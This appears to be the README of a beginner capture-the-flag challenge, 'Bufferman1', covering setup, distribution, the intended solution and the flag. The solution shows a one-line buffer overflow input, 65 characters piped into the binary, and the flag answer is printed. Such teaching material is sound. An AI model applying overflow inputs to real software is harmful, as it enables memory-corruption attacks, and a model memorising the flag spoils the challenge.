#Bufferman1

##Question Text
I am stuck in a room and the only way to get out is to change the changethis variable but...?!??!!?

Creator - Nicolas Teo 

##Setup Guide 
Host bufferman1 on a port and have bufferman1 and flag.txt in the same folder. 

##Distribution 
Distribute test.c

##Solution
Simple buffer overflow exploit. For buffer to overflow, 65 characters are needed.
echo `python3 -c 'print("A"*64)'` | ./bufferman1 would not work. 
echo `python3 -c 'print("A"*65)'` | ./bufferman1 works.

##Flag 
HNF(s1mp1e_buff3r_0v3rfl0w)
